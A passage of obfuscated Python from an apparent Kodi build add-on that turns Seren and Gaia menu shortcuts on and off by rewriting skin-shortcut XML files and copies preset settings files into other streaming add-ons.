    OOOO000000O00O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:560
    with open (OOOO000000O00O000 ,'r')as OOO00O00O0O0OOO00 :#line:561
      O0O0000OO0000OOOO =OOO00O00O0O0OOO00 .read ()#line:562
    O0O0000OO0000OOOO =O0O0000OO0000OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:580
    with open (OOOO000000O00O000 ,'w')as OOO00O00O0O0OOO00 :#line:583
      OOO00O00O0O0OOO00 .write (O0O0000OO0000OOOO )#line:584
    OOOO000000O00O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:587
    with open (OOOO000000O00O000 ,'r')as OOO00O00O0O0OOO00 :#line:588
      O0O0000OO0000OOOO =OOO00O00O0O0OOO00 .read ()#line:589
    O0O0000OO0000OOOO =O0O0000OO0000OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:607
    with open (OOOO000000O00O000 ,'w')as OOO00O00O0O0OOO00 :#line:610
      OOO00O00O0O0OOO00 .write (O0O0000OO0000OOOO )#line:611
    OOOO000000O00O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:613
    with open (OOOO000000O00O000 ,'r')as OOO00O00O0O0OOO00 :#line:614
      O0O0000OO0000OOOO =OOO00O00O0O0OOO00 .read ()#line:615
    O0O0000OO0000OOOO =O0O0000OO0000OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:633
    with open (OOOO000000O00O000 ,'w')as OOO00O00O0O0OOO00 :#line:636
      OOO00O00O0O0OOO00 .write (O0O0000OO0000OOOO )#line:637
    OOOO000000O00O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:639
    with open (OOOO000000O00O000 ,'r')as OOO00O00O0O0OOO00 :#line:640
      O0O0000OO0000OOOO =OOO00O00O0O0OOO00 .read ()#line:641
    O0O0000OO0000OOOO =O0O0000OO0000OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:659
    with open (OOOO000000O00O000 ,'w')as OOO00O00O0O0OOO00 :#line:662
      OOO00O00O0O0OOO00 .write (O0O0000OO0000OOOO )#line:663
    OOOO000000O00O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:666
    with open (OOOO000000O00O000 ,'r')as OOO00O00O0O0OOO00 :#line:667
      O0O0000OO0000OOOO =OOO00O00O0O0OOO00 .read ()#line:668
    O0O0000OO0000OOOO =O0O0000OO0000OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:686
    with open (OOOO000000O00O000 ,'w')as OOO00O00O0O0OOO00 :#line:689
      OOO00O00O0O0OOO00 .write (O0O0000OO0000OOOO )#line:690
def rdbuildinstall ():#line:693
  try :#line:694
   O000O00OOOOO0O0OO =(ADDON .getSetting ("rdbuild"))#line:695
   if O000O00OOOOO0O0OO =='true':#line:696
     OOOOO0O0O0000O0O0 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:697
     O0000O0O0O000O0OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:698
     copyfile (OOOOO0O0O0000O0O0 ,O0000O0O0O000O0OO )#line:699
  except :#line:700
     pass #line:701
def rdbuildaddonoff ():#line:704
    OOO0OO0O0O0000O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:707
    with open (OOO0OO0O0O0000O0O ,'r')as OO000OOO00000O0O0 :#line:708
      OO00O00OOO00O00OO =OO000OOO00000O0O0 .read ()#line:709
    OO00O00OOO00O00OO =OO00O00OOO00O00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:727
    with open (OOO0OO0O0O0000O0O ,'w')as OO000OOO00000O0O0 :#line:730
      OO000OOO00000O0O0 .write (OO00O00OOO00O00OO )#line:731
    OOO0OO0O0O0000O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:735
    with open (OOO0OO0O0O0000O0O ,'r')as OO000OOO00000O0O0 :#line:736
      OO00O00OOO00O00OO =OO000OOO00000O0O0 .read ()#line:737
    OO00O00OOO00O00OO =OO00O00OOO00O00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:755
    with open (OOO0OO0O0O0000O0O ,'w')as OO000OOO00000O0O0 :#line:758
      OO000OOO00000O0O0 .write (OO00O00OOO00O00OO )#line:759
    OOO0OO0O0O0000O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:763
    with open (OOO0OO0O0O0000O0O ,'r')as OO000OOO00000O0O0 :#line:764
      OO00O00OOO00O00OO =OO000OOO00000O0O0 .read ()#line:765
    OO00O00OOO00O00OO =OO00O00OOO00O00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:783
    with open (OOO0OO0O0O0000O0O ,'w')as OO000OOO00000O0O0 :#line:786
      OO000OOO00000O0O0 .write (OO00O00OOO00O00OO )#line:787
    OOO0OO0O0O0000O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:791
    with open (OOO0OO0O0O0000O0O ,'r')as OO000OOO00000O0O0 :#line:792
      OO00O00OOO00O00OO =OO000OOO00000O0O0 .read ()#line:793
    OO00O00OOO00O00OO =OO00O00OOO00O00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:811
    with open (OOO0OO0O0O0000O0O ,'w')as OO000OOO00000O0O0 :#line:814
      OO000OOO00000O0O0 .write (OO00O00OOO00O00OO )#line:815
    OOO0OO0O0O0000O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:818
    with open (OOO0OO0O0O0000O0O ,'r')as OO000OOO00000O0O0 :#line:819
      OO00O00OOO00O00OO =OO000OOO00000O0O0 .read ()#line:820
    OO00O00OOO00O00OO =OO00O00OOO00O00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:838
    with open (OOO0OO0O0O0000O0O ,'w')as OO000OOO00000O0O0 :#line:841
      OO000OOO00000O0O0 .write (OO00O00OOO00O00OO )#line:842
    OOO0OO0O0O0000O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:844
    with open (OOO0OO0O0O0000O0O ,'r')as OO000OOO00000O0O0 :#line:845
      OO00O00OOO00O00OO =OO000OOO00000O0O0 .read ()#line:846
    OO00O00OOO00O00OO =OO00O00OOO00O00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:864
    with open (OOO0OO0O0O0000O0O ,'w')as OO000OOO00000O0O0 :#line:867
      OO000OOO00000O0O0 .write (OO00O00OOO00O00OO )#line:868
    OOO0OO0O0O0000O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:870
    with open (OOO0OO0O0O0000O0O ,'r')as OO000OOO00000O0O0 :#line:871
      OO00O00OOO00O00OO =OO000OOO00000O0O0 .read ()#line:872
    OO00O00OOO00O00OO =OO00O00OOO00O00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:890
    with open (OOO0OO0O0O0000O0O ,'w')as OO000OOO00000O0O0 :#line:893
      OO000OOO00000O0O0 .write (OO00O00OOO00O00OO )#line:894
    OOO0OO0O0O0000O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:897
    with open (OOO0OO0O0O0000O0O ,'r')as OO000OOO00000O0O0 :#line:898
      OO00O00OOO00O00OO =OO000OOO00000O0O0 .read ()#line:899
    OO00O00OOO00O00OO =OO00O00OOO00O00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:917
    with open (OOO0OO0O0O0000O0O ,'w')as OO000OOO00000O0O0 :#line:920
      OO000OOO00000O0O0 .write (OO00O00OOO00O00OO )#line:921
def rdbuildinstalloff ():#line:924
    try :#line:925
       O0OOOOOOOO000000O =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:926
       OO00000OOOOOO000O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:927
       copyfile (O0OOOOOOOO000000O ,OO00000OOOOOO000O )#line:929
       O0OOOOOOOO000000O =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:931
       OO00000OOOOOO000O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:932
       copyfile (O0OOOOOOOO000000O ,OO00000OOOOOO000O )#line:934
       O0OOOOOOOO000000O =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:936
       OO00000OOOOOO000O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:937
       copyfile (O0OOOOOOOO000000O ,OO00000OOOOOO000O )#line:939
       O0OOOOOOOO000000O =ADDONPATH +"/resources/rdoff/Splash.png"#line:942
       OO00000OOOOOO000O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:943
       copyfile (O0OOOOOOOO000000O ,OO00000OOOOOO000O )#line:945
    except :#line:947
       pass #line:948
def rdbuildaddonON ():#line:955
    O0O00OO0OO0OOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:957
    with open (O0O00OO0OO0OOOO00 ,'r')as OO0O0O0O0O0O00000 :#line:958
      O00O00OOOO0OOO000 =OO0O0O0O0O0O00000 .read ()#line:959
    O00O00OOOO0OOO000 =O00O00OOOO0OOO000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:977
    with open (O0O00OO0OO0OOOO00 ,'w')as OO0O0O0O0O0O00000 :#line:980
      OO0O0O0O0O0O00000 .write (O00O00OOOO0OOO000 )#line:981
    O0O00OO0OO0OOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:985
    with open (O0O00OO0OO0OOOO00 ,'r')as OO0O0O0O0O0O00000 :#line:986
      O00O00OOOO0OOO000 =OO0O0O0O0O0O00000 .read ()#line:987
    O00O00OOOO0OOO000 =O00O00OOOO0OOO000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1005
    with open (O0O00OO0OO0OOOO00 ,'w')as OO0O0O0O0O0O00000 :#line:1008
      OO0O0O0O0O0O00000 .write (O00O00OOOO0OOO000 )#line:1009
    O0O00OO0OO0OOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1013
    with open (O0O00OO0OO0OOOO00 ,'r')as OO0O0O0O0O0O00000 :#line:1014
      O00O00OOOO0OOO000 =OO0O0O0O0O0O00000 .read ()#line:1015
    O00O00OOOO0OOO000 =O00O00OOOO0OOO000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1033
    with open (O0O00OO0OO0OOOO00 ,'w')as OO0O0O0O0O0O00000 :#line:1036
      OO0O0O0O0O0O00000 .write (O00O00OOOO0OOO000 )#line:1037
    O0O00OO0OO0OOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1041
    with open (O0O00OO0OO0OOOO00 ,'r')as OO0O0O0O0O0O00000 :#line:1042
      O00O00OOOO0OOO000 =OO0O0O0O0O0O00000 .read ()#line:1043
    O00O00OOOO0OOO000 =O00O00OOOO0OOO000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1061
    with open (O0O00OO0OO0OOOO00 ,'w')as OO0O0O0O0O0O00000 :#line:1064
      OO0O0O0O0O0O00000 .write (O00O00OOOO0OOO000 )#line:1065
    O0O00OO0OO0OOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1068
    with open (O0O00OO0OO0OOOO00 ,'r')as OO0O0O0O0O0O00000 :#line:1069
      O00O00OOOO0OOO000 =OO0O0O0O0O0O00000 .read ()#line:1070
    O00O00OOOO0OOO000 =O00O00OOOO0OOO000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1088
    with open (O0O00OO0OO0OOOO00 ,'w')as OO0O0O0O0O0O00000 :#line:1091
      OO0O0O0O0O0O00000 .write (O00O00OOOO0OOO000 )#line:1092
    O0O00OO0OO0OOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1094
    with open (O0O00OO0OO0OOOO00 ,'r')as OO0O0O0O0O0O00000 :#line:1095
      O00O00OOOO0OOO000 =OO0O0O0O0O0O00000 .read ()#line:1096
    O00O00OOOO0OOO000 =O00O00OOOO0OOO000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1114
    with open (O0O00OO0OO0OOOO00 ,'w')as OO0O0O0O0O0O00000 :#line:1117
      OO0O0O0O0O0O00000 .write (O00O00OOOO0OOO000 )#line:1118
    O0O00OO0OO0OOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1120
    with open (O0O00OO0OO0OOOO00 ,'r')as OO0O0O0O0O0O00000 :#line:1121
      O00O00OOOO0OOO000 =OO0O0O0O0O0O00000 .read ()#line:1122
    O00O00OOOO0OOO000 =O00O00OOOO0OOO000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1140
    with open (O0O00OO0OO0OOOO00 ,'w')as OO0O0O0O0O0O00000 :#line:1143
      OO0O0O0O0O0O00000 .write (O00O00OOOO0OOO000 )#line:1144
    O0O00OO0OO0OOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1147
    with open (O0O00OO0OO0OOOO00 ,'r')as OO0O0O0O0O0O00000 :#line:1148
      O00O00OOOO0OOO000 =OO0O0O0O0O0O00000 .read ()#line:1149
    O00O00OOOO0OOO000 =O00O00OOOO0OOO000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1167
    with open (O0O00OO0OO0OOOO00 ,'w')as OO0O0O0O0O0O00000 :#line:1170
      OO0O0O0O0O0O00000 .write (O00O00OOOO0OOO000 )#line:1171
def rdbuildinstallON ():#line:1174
    try :#line:1176
       OOO0OO0O000OO0OO0 =ADDONPATH +"/resources/rd/victory.xml"#line:1177
       O0OO000O0O0OOOO0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1178
       copyfile (OOO0OO0O000OO0OO0 ,O0OO000O0O0OOOO0O )#line:1180
       OOO0OO0O000OO0OO0 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1182
       O0OO000O0O0OOOO0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1183
       copyfile (OOO0OO0O000OO0OO0 ,O0OO000O0O0OOOO0O )#line:1185
       OOO0OO0O000OO0OO0 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1187
       O0OO000O0O0OOOO0O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1188
       copyfile (OOO0OO0O000OO0OO0 ,O0OO000O0O0OOOO0O )#line:1190
       OOO0OO0O000OO0OO0 =ADDONPATH +"/resources/rd/Splash.png"#line:1193
       O0OO000O0O0OOOO0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1194
       copyfile (OOO0OO0O000OO0OO0 ,O0OO000O0O0OOOO0O )#line:1196
    except :#line:1198
       pass #line:1199
def rdbuild ():#line:1209
	O0OOOOO0O00000OO0 =(ADDON .getSetting ("rdbuild"))#line:1210
	if O0OOOOO0O00000OO0 =='true':#line:1211
		OO0OOOOOOO00OOOO0 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1212
		OO0OOOOOOO00OOOO0 .setSetting ('all_t','0')#line:1213
		OO0OOOOOOO00OOOO0 .setSetting ('rd_menu_enable','false')#line:1214
		OO0OOOOOOO00OOOO0 .setSetting ('magnet_bay','false')#line:1215
